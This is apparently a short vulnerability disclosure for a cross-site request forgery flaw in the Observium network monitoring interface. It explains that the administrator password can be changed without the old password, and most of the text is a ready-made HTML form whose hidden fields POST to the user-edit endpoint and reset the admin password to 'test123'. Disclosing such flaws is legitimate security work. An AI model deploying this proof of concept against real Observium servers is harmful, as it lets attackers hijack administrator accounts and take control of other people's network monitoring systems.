# Details:

Observium focuses on providing a beautiful and powerful yet simple and intuitive interface to the health and status of your network.

CSRF details
due to lack of csrf protection, it is possible to create an additional administrator user, or change the current administrator password since it does not ask for the previous password before changing it.
i.e. New password <Enter new pass> & retype password <Enter new pass>
instead of having to insert the older password.
such an attack would look like this:
-->

<html>
<div align="center">
<pre>

<h2><b>Change admin password<b></h2>
<body>
<form
action="http://observiumIP/edituser/user_id=1/"
method="POST">
<input type="hidden" name="action" value="changepass" />
<input type="hidden" name="new_pass" value="test123" />
<input type="hidden" name="new_pass2" value="test123" />
<input type="submit" name="submit" value="save" />
    </form>
    </body>
</div>
</html>
